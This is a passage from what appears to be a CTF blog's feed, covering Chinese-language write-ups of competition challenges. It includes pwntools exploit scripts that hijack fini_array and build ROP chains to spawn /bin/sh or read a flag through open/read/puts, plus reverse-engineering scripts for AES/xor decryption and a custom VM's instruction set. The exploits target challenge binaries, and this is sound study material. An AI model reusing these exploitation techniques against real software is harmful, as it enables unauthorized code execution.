class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x402504</span></span><br><span class="line">pop_rsp = <span class="number">0x402ee9</span> <span class="comment"># pop rsp; ret;</span></span><br><span class="line">pop_rdi = <span class="number">0x401746</span> <span class="comment"># pop rdi; ret;</span></span><br><span class="line">pop_rsi = <span class="number">0x406f70</span> <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdx = <span class="number">0x447635</span> <span class="comment"># pop rdx; ret;</span></span><br><span class="line">pop_rax = <span class="number">0x44806c</span> <span class="comment"># pop rax; ret;</span></span><br><span class="line">leave = <span class="number">0x401CF3</span> <span class="comment"># leave; ret;</span></span><br><span class="line">fini_array_0 = <span class="number">0x4B50B0</span></span><br><span class="line">fini_array_1 = <span class="number">0x4B50B8</span></span><br><span class="line">bss = <span class="number">0x00000000004BD300</span> <span class="comment"># bss + 0x300</span></span><br><span class="line">main = <span class="number">0x401C1D</span></span><br><span class="line">__libc_csu_fini = <span class="number">0x402CA0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line"><span class="comment"># _start ==&gt; __libc_start_main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; init_array[0]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_init  --&gt; ...</span></span><br><span class="line"><span class="comment">#                  |                      \--&gt; init_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; fini_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_fini  --&gt; ...</span></span><br><span class="line"><span class="comment">#                                         \--&gt; fini_array[0]</span></span><br><span class="line"><span class="comment">###############################################################</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; __libc_csu_fini</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; main</span></span><br><span class="line"><span class="comment"># thus the program will execute as:</span></span><br><span class="line"><span class="comment"># main -&gt; __libc_csu_fini -&gt; main(fini_array_1) -&gt; libc_csu_fini(fini_array_0)</span></span><br><span class="line"><span class="comment">#                               ^                              |</span></span><br><span class="line"><span class="comment">#                               |                              |                       </span></span><br><span class="line"><span class="comment">#                               +------------------------------+</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(__libc_csu_fini) + p64(main)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put data on bss (later will be set as fake stack)</span></span><br><span class="line">payload = p64(bss)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span>.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(bss)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span> * <span class="number">2</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x18</span> * <span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(syscall)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since at this moment rbp == fini_array_0</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; leave</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; pop_rsp</span></span><br><span class="line"><span class="comment">#     fini_array_1 + 8 ==&gt; bss</span></span><br><span class="line"><span class="comment"># migrate stack to bss</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(leave) + p64(pop_rsp)</span><br><span class="line">payload += p64(bss + <span class="number">0x8</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ol><li>“/dev/random”每次<code>open</code>都没有<code>close</code>，默认情况下，一个进程最大文件描述符是1023（一共1024个），所以只要后面文件描述符用尽，读出来的就是”\x00”了</li><li>利用上面的思路，成功233次后，就可以利用rop了</li><li>题目应该是不能直接拿shell的，所以就上orw，因为标准输入流0被关闭了，所以打开的flag文件的描述符就是0了，直接从0读就能拿到flag</li></ol><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x000000000040161b</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401619</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000401615</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x00000000004015F8</span></span><br><span class="line">gadget_2 = <span class="number">0x000000000040160E</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004015F8 loc_4015F8:                             ; CODE XREF: init+4C↓j</span></span><br><span class="line"><span class="string">.text:00000000004015F8                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:00000000004015FB                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:00000000004015FE                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000401601                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000401605                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000401609                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:000000000040160C                 jnz     short loc_4015F8</span></span><br><span class="line"><span class="string">.text:000000000040160E</span></span><br><span class="line"><span class="string">.text:000000000040160E loc_40160E:                             ; CODE XREF: init+31↑j</span></span><br><span class="line"><span class="string">.text:000000000040160E                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000401612                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000401613                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000401614                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000401616                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000401618                 pop     r14</span></span><br><span class="line"><span class="string">.text:000000000040161A                 pop     r15</span></span><br><span class="line"><span class="string">.text:000000000040161C                 retn</span></span><br><span class="line"><span class="string">.text:000000000040161C ; &#125; // starts at 4015C0</span></span><br><span class="line"><span class="string">.text:000000000040161C init            endp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">open_plt = elf.plt[<span class="string">"open"</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x9</span></span><br><span class="line">payload += flat([pop_rsi, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0x4021DF</span>])</span><br><span class="line">payload += flat([open_plt])</span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, elf.bss(<span class="number">0x600</span>), <span class="number">0x40</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, elf.bss(<span class="number">0x600</span>)])</span><br><span class="line">payload += flat([puts_plt])</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span> - <span class="number">1</span> + <span class="number">232</span>):</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>分析写得比较简单，因为大多是改编题，如果出现有问题的地方欢迎指正</li><li>感觉自己速度还是不够快，感觉还是不够熟练，要学的东西还很多</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;嘴上说不能再打了，一堆事情没做，身体却很诚实。主要是奔着pwn来的，也没想着要冲榜啥的，纯当练习了。&lt;br&gt;OJ1的本地和远程环境的不一致让我与AK失之交臂，还是赛后问出题的师傅才发现思路是对的（难顶，我的本地感觉有毒，无数次死在本地环境上）。简单记录一下， 没有写的很详细。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 第四场: rev</title>
    <link href="https://n0nop.com/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/"/>
    <id>https://n0nop.com/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/</id>
    <published>2020-05-21T14:21:28.000Z</published>
    <updated>2020-05-21T14:49:09.969Z</updated>
    
    <content type="html"><![CDATA[<p>pwn学艺不精，确认过名字，是我没学过的类型。就搞了一个babyvm，java是后来看的，还有个babyperf，最近rev做得少，没见过，还没搞出来，学一波先。</p><a id="more"></a><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>挺简单的，就不详细写了，就是xor + AES_ECB + base64。</p><h2 id="script"><a href="#script" class="headerlink" title="script"></a>script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> bd</span><br><span class="line"></span><br><span class="line">val = [<span class="number">214</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">254</span>, <span class="number">204</span>, <span class="number">225</span>, <span class="number">61</span>, <span class="number">183</span>, <span class="number">22</span>, <span class="number">182</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">40</span>, <span class="number">251</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">42</span>, <span class="number">190</span>, <span class="number">4</span>, <span class="number">195</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">170</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">38</span>, <span class="number">73</span>, <span class="number">134</span>, <span class="number">43</span>, <span class="number">103</span>, <span class="number">153</span>, <span class="number">156</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">145</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">239</span>, <span class="number">152</span>, <span class="number">122</span>, <span class="number">98</span>, <span class="number">50</span>, <span class="number">214</span>]</span><br><span class="line"></span><br><span class="line">string = bd(<span class="string">'VsBDJCvuhD65/+sL+Hlf587nWuIa2MPcqZaq7GMVWI0Vx8l9R42PXWbhCRftoFB3'</span>)</span><br><span class="line">print(string)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    res.append(ord(string[i]) ^ val[i] ^ <span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join([chr(item) <span class="keyword">for</span> item <span class="keyword">in</span> res])</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"aos_chock_koy!@#"</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">print(aes.decrypt(cipher))</span><br></pre></td></tr></table></figure><h1 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><ol><li>输入形如 “flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}” 的flag，其中”x“为[0-9a-f]</li><li>判断flag长度为42，判断flag特征，顺序提取出的16进制字符串的长度为32<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/check.png" alt></li><li>将16进制字符串encode(‘hex’)，得到长度16的字符串<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/hex.png" alt></li><li>计算字符串的md5，以及通过算法扩展至100长度的字符串的md5<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/md5.png" alt></li><li>以上明文字符串，md5，扩展md5分为4组，分组输入虚拟机计算<br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/vm.png" alt><br> <img src="/2020/05/21/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%AC%AC%E5%9B%9B%E5%9C%BA-rev/prepare.png" alt></li><li>虚拟机执行，结果通过第一个寄存器返回，指令集： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>: <span class="string">"mov"</span>, <span class="comment"># from stack</span></span><br><span class="line"><span class="number">0x1</span>: <span class="string">"push"</span>, <span class="comment"># imm</span></span><br><span class="line"><span class="number">0x2</span>: <span class="string">"pop"</span>,</span><br><span class="line"><span class="number">0x3</span>: <span class="string">"call"</span>,</span><br><span class="line"><span class="number">0x4</span>: <span class="string">"ret"</span>,</span><br><span class="line"><span class="number">0x5</span>: <span class="string">"jmp"</span>,</span><br><span class="line"><span class="number">0x6</span>: <span class="string">"je"</span>,</span><br><span class="line"><span class="number">0x7</span>: <span class="string">"neg rflag"</span>,</span><br><span class="line"><span class="number">0x8</span>: <span class="string">"add"</span>,</span><br><span class="line"><span class="number">0x9</span>: <span class="string">"sub"</span>,</span><br><span class="line"><span class="number">0xA</span>: <span class="string">"mul"</span>,</span><br><span class="line"><span class="number">0xB</span>: <span class="string">"div"</span>,</span><br><span class="line"><span class="number">0xC</span>: <span class="string">"xor"</span>,</span><br><span class="line"><span class="number">0xD</span>: <span class="string">"push"</span>, <span class="comment"># reg</span></span><br><span class="line"><span class="number">0xE</span>: <span class="string">"cmp"</span>,</span><br><span class="line"><span class="number">0xF</span>: <span class="string">"and"</span>,</span><br><span class="line"><span class="number">0x10</span>: <span class="string">"or"</span>,</span><br><span class="line"><span class="number">0x11</span>: <span class="string">"ror"</span>,</span><br><span class="line"><span class="number">0x12</span>: <span class="string">"rol"</span>,</span><br><span class="line"><span class="number">0x13</span>: <span class="string">"neg"</span>,</span><br><span class="line"><span class="number">0x14</span>: <span class="string">"mod"</span>,</span><br><span class="line"><span class="number">0xD0</span>: <span class="string">"push"</span>,</span><br><span class="line"><span class="number">0xE0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack</span></span><br><span class="line"><span class="number">0xF0</span>: <span class="string">"mov"</span>, <span class="comment"># to stack (imm)</span></span><br><span class="line"><span class="number">0xFF</span>: <span class="string">"halt"</span></span><br></pre></td></tr></table></figure></li><li>将计算结果进行比较</li></ol><h2 id="script-1"><a href="#script-1" class="headerlink" title="script"></a>script</h2><ol><li>提取指令： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">ins = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x14</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0xB9</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x9E</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x19</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x04</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">opcode = \</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">"mov"</span>, <span class="comment"># from stack</span></span><br><span class="line">    <span class="number">0x1</span>: <span class="string">"push"</span>, <span class="comment"># imm</span></span><br><span class="line">    <span class="number">0x2</span>: <span class="string">"pop"</span>,</span><br><span class="line">    <span class="number">0x3</span>: <span class="string">"call"</span>,</span><br><span class="line">    <span class="number">0x4</span>: <span class="string">"ret"</span>,</span><br><span class="line">    <span class="number">0x5</span>: <span class="string">"jmp"</span>,</span><br><span class="line">    <span class="number">0x6</span>: <span class="string">"je"</span>,</span><br><span class="line">    <span class="number">0x7</span>: <span class="string">"neg rflag"</span>,</span><br><span class="line">    <span class="number">0x8</span>: <span class="string">"add"</span>,</span><br><span class="line">    <span class="number">0x9</span>: <span class="string">"sub"</span>,</span><br><span class="line">    